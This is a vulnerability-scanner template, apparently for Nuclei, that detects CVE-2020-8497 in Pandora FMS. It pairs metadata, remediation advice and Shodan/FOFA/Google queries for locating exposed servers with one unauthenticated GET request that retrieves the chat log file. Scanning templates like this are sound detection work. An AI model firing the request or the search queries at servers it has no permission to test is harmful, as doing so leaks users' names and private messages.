id: CVE-2020-8497

info:
  name: Artica Pandora FMS <=7.42 - Arbitrary File Read
  author: gy741
  severity: medium
  description: Artica Pandora FMS through 7.42 is susceptible to arbitrary file read. An attacker can read the chat history, which is in JSON format and contains user names, user IDs, private messages, and timestamps. This can potentially lead to unauthorized data modification and other operations.
  impact: |
    An attacker can exploit this vulnerability to gain unauthorized access to sensitive information, potentially leading to further compromise of the system.
  remediation: |
    Upgrade Artica Pandora FMS to version 7.43 or later to mitigate this vulnerability.
  reference:
    - https://k4m1ll0.com/cve-2020-8497.html
    - https://nvd.nist.gov/vuln/detail/CVE-2020-8497
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-8497
    cwe-id: CWE-306
    epss-score: 0.002
    epss-percentile: 0.56881
    cpe: cpe:2.3:a:artica:pandora_fms:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: artica
    product: pandora_fms
    shodan-query: http.title:"pandora fms"
    fofa-query: title="pandora fms"
    google-query: intitle:"pandora fms"
  tags: cve,cve2020,fms,artica

http:
  - method: GET
    path:
      - '{{BaseURL}}/pandora_console/attachment/pandora_chat.log.json.txt'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"type"'
          - '"id_user"'
          - '"user_name"'
          - '"text"'
        condition: and

      - type: status
        status:
          - 200
# digest: 490a004630440220715a0d0dfdf1a932762bf3e39fb0e2fe05cec4cd6b873cd85c2ecf1f1b7751b402207c5a4fa3b93000280b7fc3db20d69d6b6b5471ad09130786021fe92700d38c81:922c64590222798bb761d5b6d8e72950